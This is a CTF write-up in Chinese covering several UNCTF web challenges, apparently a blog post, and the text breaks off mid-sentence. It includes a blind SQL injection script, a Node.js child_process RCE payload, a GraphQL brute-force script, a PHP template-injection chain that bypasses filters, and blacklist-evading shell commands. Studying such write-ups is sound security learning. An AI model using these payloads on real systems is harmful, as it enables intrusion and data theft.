<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">index_url = <span class="string">"http://101.71.29.5:10002/index.php"</span></span><br><span class="line">login_url = <span class="string">"http://101.71.29.5:10002/login.php"</span></span><br><span class="line">pass_change_url = <span class="string">"http://101.71.29.5:10002/pass_change.php"</span></span><br><span class="line">register_url = <span class="string">"http://101.71.29.5:10002/login_create.php"</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">database = <span class="string">""</span><span class="comment">#mysql,security,sys</span></span><br><span class="line">version = <span class="string">"5.7.27"</span></span><br><span class="line">table_name = <span class="string">"emails,referers,uagents,users"</span> <span class="comment">#gtid_executed,fl4g,sys</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">44</span>,<span class="number">128</span>):</span><br><span class="line">        register_data = &#123;</span><br><span class="line">            <span class="string">"username"</span>:<span class="string">"admin' and ascii(substr((select * from fl4g),%d,1))=%d######################somnus1234567890121"</span>%(i,j),</span><br><span class="line">            <span class="string">"password"</span>:<span class="string">"123"</span>,</span><br><span class="line">            <span class="string">"re_password"</span>:<span class="string">"123"</span>,</span><br><span class="line">            <span class="string">"submit"</span>:<span class="string">"Register"</span></span><br><span class="line">        &#125;</span><br><span class="line">        r1 = s.post(register_url,data=register_data)</span><br><span class="line">        login_data = &#123;</span><br><span class="line">            <span class="string">"login_user"</span>:<span class="string">"admin' and ascii(substr((select * from fl4g),%d,1))=%d######################somnus1234567890121"</span>%(i,j),</span><br><span class="line">            <span class="string">"login_password"</span>: <span class="string">"123"</span>,</span><br><span class="line">            <span class="string">"mysubmit"</span>: <span class="string">"Login"</span></span><br><span class="line">        &#125;</span><br><span class="line">        r2 = s.post(login_url,data=login_data)</span><br><span class="line">        pass_change_data = &#123;</span><br><span class="line">            <span class="string">"current_password"</span>: <span class="string">"123"</span>,</span><br><span class="line">            <span class="string">"password"</span>: <span class="string">"somnus1"</span> + str(i),</span><br><span class="line">            <span class="string">"re_password"</span>: <span class="string">"somnus1"</span> + str(i),</span><br><span class="line">            <span class="string">"submit"</span>: <span class="string">"Reset"</span></span><br><span class="line">        &#125;</span><br><span class="line">        r3 = s.post(pass_change_url, data=pass_change_data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Password successfully updated"</span> <span class="keyword">in</span> r3.text:</span><br><span class="line">            database = database + chr(j)</span><br><span class="line">            <span class="keyword">print</span> database</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/UNCTF/1.png" alt=""></p>
<h3 id="checkin-600-points"><a href="#checkin-600-points" class="headerlink" title="checkin(600 points)"></a>checkin(600 points)</h3><p>靶机地址：101.71.29.5:10010 </p>
<p>打开靶机，发现是一个websocket的js网站</p>
<p>/js/app.03bc1faf.js中可以看到源码</p>
<p>根据提示，需要我们先输入<strong>/name nickname</strong>来进行登陆</p>
<p>登陆后，审计源码发现可以执行一个<strong>calc</strong>操作</p>
<p><img src="../../../../img/UNCTF/4.png" alt=""></p>
<p>疑似命令执行</p>
<p><strong>/calc 5*6</strong> 发现返回30</p>
<p>搜索发现可能是nodejs命令执行：<a href="http://qnkcdz0.xyz/2019/06/24/Node-js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Beval%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">Node.js代码审计之eval远程命令执行漏洞</a></p>
<p><img src="../../../../img/UNCTF/5.png" alt=""></p>
<p>调用<strong>child_process</strong>模块，然后过滤空格，用<strong>$IFS</strong>替代</p>
<p>执行：<strong>ls /</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/calc require(&quot;child_process&quot;).execSync(&quot;ls$IFS/&quot;).toString()</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/UNCTF/6.png" alt=""></p>
<p>发现<strong>/flag</strong></p>
<p>最后的payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/calc require(&quot;child_process&quot;).execSync(&quot;cat$IFS/flag&quot;).toString()</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/UNCTF/7.png" alt=""></p>
<h3 id="简单的备忘录-800-points"><a href="#简单的备忘录-800-points" class="headerlink" title="简单的备忘录(800 points)"></a>简单的备忘录(800 points)</h3><p>靶机地址：101.71.29.5:10012 </p>
<p>打开靶机，有个链接，访问发现是一个<strong>graphql</strong>的查询接口</p>
<p><img src="../../../../img/UNCTF/13.png" alt=""></p>
<p>通过<a href="https://github.com/prisma-labs/get-graphql-schema" target="_blank" rel="noopener">get-graphql-schema</a>将graphql模式都一一列举出来：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$get-graphql-schema http://101.71.29.5:10012/graphql</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/UNCTF/27.png" alt=""></p>
<p>摸清层次后，</p>
<p>进行层层<strong>嵌套查询</strong>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  allUsers &#123;</span><br><span class="line">    edges &#123;</span><br><span class="line">      node &#123;</span><br><span class="line">        id</span><br><span class="line">        username</span><br><span class="line">        memos&#123;</span><br><span class="line">          pageInfo &#123;</span><br><span class="line">            hasPreviousPage</span><br><span class="line">            hasNextPage</span><br><span class="line">            startCursor</span><br><span class="line">            endCursor</span><br><span class="line">          &#125;</span><br><span class="line">          edges&#123;</span><br><span class="line">            node&#123;</span><br><span class="line">              id</span><br><span class="line">              content</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      cursor</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>flag就在<strong>Meno</strong>类的<strong>content</strong>字段中</p>
<p><img src="../../../../img/UNCTF/11.png" alt=""></p>
<h3 id="加密的备忘录-1000-points"><a href="#加密的备忘录-1000-points" class="headerlink" title="加密的备忘录(1000 points)"></a>加密的备忘录(1000 points)</h3><p>靶机地址：101.71.29.5:10037 </p>
<p>打开靶机</p>
<p><img src="../../../../img/UNCTF/14.png" alt=""></p>
<p>源码提示我们：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--     GraphQL 真方便       All your base are belong to us!!!!!      --&gt;</span><br></pre></td></tr></table></figure>

<p>访问一下，还是有graphql接口，只是没有像上一题那样写一个界面</p>
<p><img src="../../../../img/UNCTF/15.png" alt=""></p>
<p>同样用<strong>get-graphql-schema</strong>列出结构：</p>
<p><img src="../../../../img/UNCTF/26.png" alt=""></p>
<p>相比于上一题，发现<strong>Query</strong>类中多了一个方法<strong>checkPass</strong>，类<strong>Memo_</strong>也多了一个成员属性<strong>password</strong>，我们同样用上一关的payload来查询一下结果。</p>
<p>因为没有提供接口，需要我们自己构造请求的数据包，头部字段需要添加：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/UNCTF/93.png" alt=""></p>
<p>查询结果发现，相比于之前那题，<strong>content</strong>字段和多出来的<strong>password</strong>字段的值看起来像是经过<strong>unicode</strong>编码，将password字段值拿去unicode解码试试</p>
<p><img src="../../../../img/UNCTF/16.png" alt=""></p>
<p>发现是一串很奇怪的汉字</p>
<p>想到还有一个方法<strong>checkPass</strong>没试，于是构造一下数据包：</p>
<p><img src="../../../../img/UNCTF/17.png" alt=""></p>
<p>从查询结果来分析，我们输入的<strong>password：1</strong>貌似经过了unicode编码后，返回告诉我们这个密码查询结果为空</p>
<p>把1经过unicode编码后的字符串：<strong>\u4e3a\u6211\u7231\u7231</strong></p>
<p>再次拿去解码：</p>
<p><img src="../../../../img/UNCTF/18.png" alt=""></p>
<p>又是一串看不懂的中文，而如果我们直接把前面查的password字段中的字符串拿来查询：</p>
<p><img src="../../../../img/UNCTF/19.png" alt=""></p>
<p>结果出现整形溢出而报错</p>
<p>所以猜测：这个<strong>checkPass</strong>方法会将我们查询的password值进行一次变形的unicode编码后，进行查询</p>
<p>那么，我们就需要将password字段值进行还原明文的操作</p>
<p>通过测试发现，可以进行<strong>逐位爆破</strong>明文，现在我们要破解的是password密文：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u8981\u6709\u4e86\u4ea7\u4e8e\u4e86\u4e3b\u65b9\u4ee5\u5b9a\u4eba\u65b9\u4e8e\u6709\u6210\u4ee5\u4ed6\u7684\u7231\u7231</span><br></pre></td></tr></table></figure>

<p>那么，首先先对第一个密文字符串：<strong>\u8981</strong>进行解密</p>
<p>首先爆破第一位明文：</p>
<p><img src="../../../../img/UNCTF/20.png" alt=""></p>
<p><img src="../../../../img/UNCTF/21.png" alt=""></p>
<p>爆破发现，第一个明文范围可能为<strong>[H-K]</strong></p>
<p>第二个明文，就根据第一个明文的可能来列举爆破，看看是否符合最前面两串密文字符串：<strong>\u8981\u6709</strong></p>
<p><img src="../../../../img/UNCTF/22.png" alt=""></p>
<p><img src="../../../../img/UNCTF/23.png" alt=""></p>
<p>发现，第一个明文字符为<strong>H</strong>时，第二个明文字符为<strong>[a-o]</strong>，前两串密文都满足：<strong>\u8981\u6709</strong></p>
<p>由此确定，第一个明文字符为：<strong>H</strong></p>
<p>以此类推，根据checkPass返回的结果来逐位爆破出明文，按照这个思路，编写爆破exp，代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://101.71.29.5:10037/graphql"</span></span><br><span class="line">s = string.ascii_letters + string.digits + <span class="string">"&#123;&#125;"</span></span><br><span class="line"></span><br><span class="line">password = <span class="string">"\u8981\u6709\u4e86\u4ea7\u4e8e\u4e86\u4e3b\u65b9\u4ee5\u5b9a\u4eba\u65b9\u4e8e\u6709\u6210\u4ee5\u4ed6\u7684\u7231\u7231"</span></span><br><span class="line"><span class="comment">#password = "\u5230\u5e74\u79cd\u6210\u5230\u5b9a\u8fc7\u6210\u4e2a\u4ed6\u6210\u4f1a\u4e3a\u800c\u65f6\u65b9\u4e0a\u800c\u5230\u5e74\u5230\u5e74\u4ee5\u53ef\u4e3a\u591a\u4e3a\u800c\u5230\u53ef\u5bf9\u65b9\u751f\u800c\u4ee5\u5e74\u4e3a\u6709\u5230\u6210\u4e0a\u53ef\u6211\u884c\u5230\u4ed6\u7684\u9762\u4e3a\u4eec\u65b9\u7231"</span></span><br><span class="line">find_password = <span class="string">""</span></span><br><span class="line">change_password = <span class="string">""</span><span class="comment">#HappY4Gr4phQL</span></span><br><span class="line">pass_list = password.split(<span class="string">"\u"</span>)[<span class="number">1</span>:]</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">query = &#123;<span class="string">"query"</span>:<span class="string">"&#123;\n  checkPass(memoId: 1, password:\"%s\")\n&#125;\n"</span>&#125;</span><br><span class="line">query = json.dumps(query)</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"Content-Type"</span>:<span class="string">"application/json"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> find_password != password:</span><br><span class="line">    possible_list = []</span><br><span class="line">    end = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        payload = query % (change_password + i)</span><br><span class="line">        s1 = requests.Session()</span><br><span class="line">        r = s1.post(url,headers= headers,data=payload)</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        message = str(re.findall(<span class="string">"'(.*)' not"</span>,r.text)[<span class="number">0</span>])</span><br><span class="line">        message_list = message.split(<span class="string">"\u"</span>)[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> (message_list[count] == pass_list[count]) <span class="keyword">and</span> (message_list[count + <span class="number">1</span>] == pass_list[count + <span class="number">1</span>]) <span class="keyword">and</span> (message_list[count + <span class="number">2</span>] == pass_list[count + <span class="number">2</span>]):</span><br><span class="line">            change_password = change_password + i</span><br><span class="line">            end = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> message_list[count] == pass_list[count]:</span><br><span class="line">            possible_list.append(i)</span><br><span class="line">    <span class="keyword">if</span> end == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> change_password</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment">#print possible_list</span></span><br><span class="line">    count = count + <span class="number">1</span></span><br><span class="line">    poss1_list = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> possible_list:</span><br><span class="line">        <span class="keyword">for</span> z <span class="keyword">in</span> s:</span><br><span class="line">            payload = query % (change_password+j+z)</span><br><span class="line">            s1 = requests.Session()</span><br><span class="line">            r1 = s1.post(url, headers=headers, data=payload)</span><br><span class="line">            sleep(<span class="number">0.1</span>)</span><br><span class="line">            message = str(re.findall(<span class="string">"'(.*)' not"</span>, r1.text)[<span class="number">0</span>])</span><br><span class="line">            message_list = message.split(<span class="string">"\u"</span>)[<span class="number">1</span>:]</span><br><span class="line">            <span class="keyword">if</span> (message_list[count] == pass_list[count]) <span class="keyword">and</span> (message_list[count + <span class="number">1</span>] == pass_list[count + <span class="number">1</span>]) <span class="keyword">and</span> (message_list[count + <span class="number">2</span>] == pass_list[count + <span class="number">2</span>]):</span><br><span class="line">                end = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> message_list[count] == pass_list[count]:</span><br><span class="line">                poss1_list.append(z)</span><br><span class="line">        <span class="keyword">if</span> len(poss1_list) != <span class="number">0</span>:</span><br><span class="line">            change_password = change_password + j</span><br><span class="line">            <span class="keyword">if</span> end == <span class="number">1</span>:</span><br><span class="line">                change_password = change_password + z</span><br><span class="line">            find_password = find_password + <span class="string">"\u"</span> + pass_list[count - <span class="number">1</span>]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> end == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> end == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> change_password</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment">#print poss1_list</span></span><br><span class="line">    <span class="keyword">if</span> len(poss1_list) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> change_password</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        count = count + <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> poss1_list:</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> s:</span><br><span class="line">                payload = query % (change_password + k + m)</span><br><span class="line">                s1 = requests.Session()</span><br><span class="line">                r2 = s1.post(url,headers=headers,data=payload)</span><br><span class="line">                sleep(<span class="number">0.1</span>)</span><br><span class="line">                message = str(re.findall(<span class="string">"'(.*)' not"</span>, r2.text)[<span class="number">0</span>])</span><br><span class="line">                message_list = message.split(<span class="string">"\u"</span>)[<span class="number">1</span>:]</span><br><span class="line">                <span class="keyword">if</span> (message_list[count] == pass_list[count]) <span class="keyword">and</span> (message_list[count + <span class="number">1</span>] == pass_list[count + <span class="number">1</span>]):</span><br><span class="line">                    change_password = change_password + k + m</span><br><span class="line">                    find_password = find_password + <span class="string">"\u"</span> + pass_list[count - <span class="number">1</span>] + <span class="string">"\u"</span> + pass_list[count] + <span class="string">"\u"</span> + pass_list[count + <span class="number">1</span>]</span><br><span class="line">                    end = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> end == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        count = count + <span class="number">2</span></span><br><span class="line">        <span class="keyword">print</span> change_password</span><br><span class="line">        <span class="keyword">print</span> find_password</span><br></pre></td></tr></table></figure>

<p>跑出的密码是：<strong>HappY4Gr4phQL</strong></p>
<p><img src="../../../../img/UNCTF/28.png" alt=""></p>
<p>检查一下是否正确：</p>
<p><img src="../../../../img/UNCTF/25.png" alt=""></p>
<p>查询结果为true，说明正确，但是，没有返回flag，这时候突然想到，<strong>content</strong>字段中也有一串密文，按照上题来看，flag估计就是content字段的明文值了，于是继续爆破<strong>content</strong>字段密文</p>
<p><img src="../../../../img/UNCTF/24.png" alt=""></p>
<p>最后跑出flag：flag{a98b35476ffdc3c3f84c4f0fa648e021}</p>
<h3 id="审计一下世界上最好的语言吧（1000-points）"><a href="#审计一下世界上最好的语言吧（1000-points）" class="headerlink" title="审计一下世界上最好的语言吧（1000 points）"></a>审计一下世界上最好的语言吧（1000 points）</h3><p>靶机地址：101.71.29.5:10003 </p>
<p>打开靶机，给了源码：<strong><a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></strong></p>
<p>开始审计</p>
<p>漏洞触发点很明显，只有一个，在<strong>parse_template.php</strong>的<strong>parseIf</strong>函数中</p>
<p><img src="../../../../img/UNCTF/29.png" alt=""></p>
<p>分析发现，该函数对传入的参数<strong>$content</strong>进行<code>{if:(.*?)}(.*?){end if}</code>规则的正则匹配，将匹配的结果的第一个元素，即<code>{if:(.*?)}</code>的<code>(.*?)</code>匹配字符串拼接到<strong>eval</strong>函数中<strong>执行命令</strong></p>
<p>那么，就接着找找哪里调用了<strong>parseIf</strong>函数</p>
<p><img src="../../../../img/UNCTF/94.png" alt=""></p>
<p>在<strong>parse_template.php</strong>的<strong>parse_again</strong>函数的末尾，调用了该函数，继续跟踪，就发现在<strong>index.php</strong>的最后，调用了<strong>parse_again</strong>函数</p>
<p><img src="../../../../img/UNCTF/30.png" alt=""></p>
<p>接下来，就是想办法让输入的参数符合条件，来执行<strong>parse_again</strong>函数，进而执行<strong>parseIf</strong>函数，触发漏洞</p>
<p>首先看下全局过滤：<strong>common.php</strong></p>
<p><img src="../../../../img/UNCTF/31.png" alt=""></p>
<p>全局文件<strong>common.php</strong>对GET，POST，COOKIE中的参数进行了进行了<strong>check_var</strong>的检查，过滤了关键字：<strong>_GET</strong>，<strong>_POST</strong>，<strong>GLOBALS</strong></p>
<p>然后，进行了<strong>变量覆盖</strong>的操作</p>
<p>所以执行<strong>parse_again</strong>函数的条件，就是<strong>content</strong>参数符合正则匹配：<code>&lt;search&gt;(.*?)&lt;\/search&gt;</code></p>
<p><img src="../../../../img/UNCTF/32.png" alt=""></p>
<p>也就是说，我们随便传个参数<code>?content=&lt;search&gt;123&lt;/search&gt;</code>就可以执行<strong>parse_again</strong></p>
<p>然后重点审计<strong>parse_again</strong>函数</p>
<p><img src="../../../../img/UNCTF/33.png" alt=""></p>
<p>该函数处理过程大致是：对传入的<strong>searchnum</strong>，<strong>type</strong>，<strong>typename</strong>和index.php中一开始传入的参数<strong>content</strong>，进行一个<strong>RemoveXSS</strong>的过滤，该函数过滤了大部分关键字：</p>
<p><img src="../../../../img/UNCTF/34.png" alt=""></p>
<p>其中就包括了<strong>parseIf</strong>函数中匹配的关键字：<strong>if:</strong></p>
<p>过滤后，截取前20个字符，进行<strong>template.html</strong>模板文件的标签替换，最后触发<strong>parseIf</strong>，通过<strong>eval</strong>执行模板文件中符合<code>{if:(.*?)}(.*?){end if}</code>正则匹配的第一个结果字符串</p>
<p>如果我们输入的参数包含<code>{if:</code>，经过<strong>RemoveXSS</strong>处理后就变成了<code>{if&lt;x&gt;:</code>，那么必然就不符合后面的匹配</p>
<p>所以，我们首先需要想办法来绕过<strong>RemoveXSS</strong>的过滤</p>
<p>我们可以发现，在<strong>RemoveXSS</strong>的过滤和执行<strong>parseIf</strong>的中间，还进行了4次的<strong>str_replace</strong>函数的替换，那么，我们就可以利用替换，来绕过过滤，比如我们传入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content=&lt;search&gt;&#123;i&lt;haha:type&gt;f:phpinfo()&#125;&#123;end if&#125;&lt;/search&gt;</span><br></pre></td></tr></table></figure>

<p>因为type参数为空，所以最后传入parseIf函数的内容就包括：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;search&gt;&#123;if:phpinfo()&#125;&#123;end if&#125;&lt;/search&gt;</span><br></pre></td></tr></table></figure>

<p>就能成功匹配了，但是，这里还有长度20的限制，所以，我们可以通过多次替换，来绕过限制</p>
<p><img src="../../../../img/UNCTF/35.png" alt=""></p>
<p>在模板文件中，存在一处可以让我们通过拼接来凑成<code>{if:(.*?)}(.*?){end if}</code>匹配结构的地方</p>
<p>于是，传入payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content=?content=&lt;search&gt;&#123;i&#123;haha:type&#125;&lt;/search&gt;&amp;searchnum=&#123;end%20if&#125;&amp;type=f:phpinfo()&#125;</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/UNCTF/36.png" alt=""></p>
<p>成功执行<strong>phpinfo</strong>，看看有没有disable_functions的限制</p>
<p><img src="../../../../img/UNCTF/37.png" alt=""></p>
<p>没有限制，那么接下来就是读<strong>flag.php</strong>文件，选用一个最短的<strong>readfile</strong>函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content=?content=&lt;search&gt;&#123;i&#123;haha:type&#125;&lt;/search&gt;&amp;searchnum=&#123;end%20if&#125;&amp;type=f:readfile(&apos;flag.php&apos;)&#125;</span><br></pre></td></tr></table></figure>

<p>但是，这样<strong>type</strong>参数长度还是超过了20，这时候，想到还有最后一个参数<strong>typename</strong>没有利用到，于是，传入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content=&lt;search&gt;&#123;i&#123;haha:type&#125;&lt;/search&gt;&amp;searchnum=&#123;end%20if&#125;&amp;type=f:rea&#123;haha:typename&#125;&amp;typename=dfile(%27flag.php%27)&#125;</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/UNCTF/38.png" alt=""></p>
<p>getflag~</p>
<h3 id="bypass（800-points）"><a href="#bypass（800-points）" class="headerlink" title="bypass（800 points）"></a>bypass（800 points）</h3><p>靶机地址：101.71.29.5:10054 </p>
<p><img src="../../../../img/UNCTF/41.png" alt=""></p>
<p>命令执行bypass，过滤点有两处</p>
<p>（1）正则匹配的黑名单：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/\'|\"|,|;|\\|\`|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is"</span>, $a))</span><br><span class="line">        $a = <span class="string">""</span>;</span><br></pre></td></tr></table></figure>

<p>（2）对输入参数强制包裹双引号<strong>“”</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a =<span class="string">'"'</span> . $a . <span class="string">'"'</span>;</span><br></pre></td></tr></table></figure>

<p>其实最致命的是第二处过滤，强制添加双引号，即使我们输入了黑名单里没有的命令，在双引号的作用下，也执行不了命令</p>
<p>所以，这时候就想到了，强制命令执行的<strong>反引号`</strong></p>
<p>但是，这里好像正则过滤了？其实没有，不信，我们测试一下：</p>
<p><img src="../../../../img/UNCTF/95.png" alt=""></p>
<p>很惊奇的发现，由于前面存在的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\|</span><br></pre></td></tr></table></figure>

<p>会将<code>|</code>进行转义，这是因为在<strong>preg_match</strong>中，三个反斜杠<code>\\\</code>才能匹配一个真正意义上的字符反斜杠<code>\</code>，所以这里因为正则的匹配机制造成了<strong>反引号逃逸</strong></p>
<p>测试下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=`uname`</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/UNCTF/42.png" alt=""></p>
<p>果然成功执行<strong>uname</strong>，那么接下来，就是想办法列目录了，虽然这里<strong>ls</strong>被禁用了，但是我们还可以用<strong>dir</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=`dir /`</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/UNCTF/43.png" alt=""></p>
<p>但是没有发现flag文件，试着找了其他常见目录下，也未发现，那么，就试着执行查找文件名操作：<strong>find</strong></p>
<p>虽然<strong>find</strong>在黑名单中，但是，我们可以通过执行<strong>二进制文件</strong>和<strong>通配符</strong><code>?</code>的结合来进行绕过</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=`/usr/b??/???d / -name ?lag`</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/UNCTF/44.png" alt=""></p>
<p>但是还是未找到flag文件，再试着<strong>grep -R</strong>来搜索flag内容<strong>ctf</strong>，payload</p>
